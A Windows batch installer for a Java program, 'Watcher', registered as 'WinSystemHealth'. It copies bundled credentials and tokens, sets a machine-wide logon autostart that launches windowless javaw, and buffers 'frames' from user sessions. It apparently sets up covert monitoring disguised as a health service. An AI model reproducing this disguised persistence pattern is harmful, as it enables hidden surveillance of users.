@echo off
:: Watcher Installation Script for Windows (Run as Administrator)
echo ========================================================
echo Installing Watcher System Health Monitor on Windows...
echo ========================================================

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Error: This script must be executed with Administrator privileges.
    exit /b 1
)

set SCRIPT_DIR=%~dp0
set JAR_FILE=%SCRIPT_DIR%syshealthd.jar

if not exist "%JAR_FILE%" (
    if exist "%SCRIPT_DIR%..\target\syshealthd.jar" (
        set JAR_FILE=%SCRIPT_DIR%..\target\syshealthd.jar
    ) else (
        echo Error: syshealthd.jar was not found in the same directory as this script.
        echo Please ensure syshealthd.jar is placed next to this script in: %SCRIPT_DIR%
        exit /b 1
    )
)

:: Detect Java executable path
set JAVA_BIN=
where javaw >nul 2>&1
if %errorlevel% equ 0 (
    for /f "delims=" %%i in ('where javaw') do (
        if not defined JAVA_BIN set "JAVA_BIN=%%i"
    )
) else (
    where java >nul 2>&1
    if %errorlevel% equ 0 (
        for /f "delims=" %%i in ('where java') do (
            if not defined JAVA_BIN set "JAVA_BIN=%%i"
        )
    )
)
if not defined JAVA_BIN (
    if exist "%JAVA_HOME%\bin\javaw.exe" (
        set "JAVA_BIN=%JAVA_HOME%\bin\javaw.exe"
    ) else if exist "%JAVA_HOME%\bin\java.exe" (
        set "JAVA_BIN=%JAVA_HOME%\bin\java.exe"
    ) else (
        echo Error: Java 17+ was not found in PATH or JAVA_HOME.
        echo Please ensure Java 17+ is installed before running this installer.
        exit /b 1
    )
)
echo Detected Java runtime: %JAVA_BIN%

set TARGET_DIR=C:\ProgramData\SystemHealth
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
if not exist "%TARGET_DIR%\spool" mkdir "%TARGET_DIR%\spool"
if not exist "%TARGET_DIR%\logs" mkdir "%TARGET_DIR%\logs"

:: Copy files
echo Copying %JAR_FILE% to %TARGET_DIR%...
copy /Y "%JAR_FILE%" "%TARGET_DIR%\syshealthd.jar"

if exist "%SCRIPT_DIR%credentials.json" (
    copy /Y "%SCRIPT_DIR%credentials.json" "%TARGET_DIR%\credentials.json"
) else if exist "%SCRIPT_DIR%..\credentials.json" (
    copy /Y "%SCRIPT_DIR%..\credentials.json" "%TARGET_DIR%\credentials.json"
)

if exist "%SCRIPT_DIR%config.dat" (
    copy /Y "%SCRIPT_DIR%config.dat" "%TARGET_DIR%\config.dat"
) else if exist "%SCRIPT_DIR%..\config.dat" (
    copy /Y "%SCRIPT_DIR%..\config.dat" "%TARGET_DIR%\config.dat"
)

if exist "%SCRIPT_DIR%tokens" (
    xcopy /E /I /Y "%SCRIPT_DIR%tokens" "%TARGET_DIR%\tokens" >nul
) else if exist "%SCRIPT_DIR%..\tokens" (
    xcopy /E /I /Y "%SCRIPT_DIR%..\tokens" "%TARGET_DIR%\tokens" >nul
)

:: Create batch wrapper for manual or service execution
set WRAPPER_BAT=%TARGET_DIR%\run-service.bat
echo Creating autostart batch wrapper at %WRAPPER_BAT%...
(
    echo @echo off
    echo cd /d "%%~dp0"
    echo start "" "%JAVA_BIN%" -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -Duser.dir="%TARGET_DIR%" -Dwatcher.base.dir="%TARGET_DIR%" -Dwatcher.log.dir="%TARGET_DIR%\logs" -jar "%TARGET_DIR%\syshealthd.jar"
) > "%WRAPPER_BAT%"

:: Lockdown permissions: SYSTEM & Administrators full access, Standard Users read-only/no-delete on root
echo Hardening directory permissions...
icacls "%TARGET_DIR%" /inheritance:r /grant:r "SYSTEM":(OI)(CI)F /grant:r "Administrators":(OI)(CI)F /grant:r "Users":(OI)(CI)RX >nul

:: Grant Users modify permissions specifically on spool and logs folders
:: This allows the daemon running in the interactive user desktop session to buffer frames and write logs
icacls "%TARGET_DIR%\spool" /grant:r "Users":(OI)(CI)M >nul
icacls "%TARGET_DIR%\logs" /grant:r "Users":(OI)(CI)M >nul

:: Clean up any existing scheduled task that would conflict by running under Admin principal on standard user logon
schtasks /delete /tn "WinSystemHealth" /f >nul 2>&1

:: Setup user logon autostart for all interactive desktop sessions
echo Configuring autostart at user logon...
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemHealth" /t REG_SZ /d "\"%JAVA_BIN%\" -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -Duser.dir=\"%TARGET_DIR%\" -Dwatcher.base.dir=\"%TARGET_DIR%\" -Dwatcher.log.dir=\"%TARGET_DIR%\logs\" -jar \"%TARGET_DIR%\syshealthd.jar\"" /f >nul

echo ========================================================
echo Watcher installed successfully!
echo Service will launch automatically at user logon.
echo ========================================================
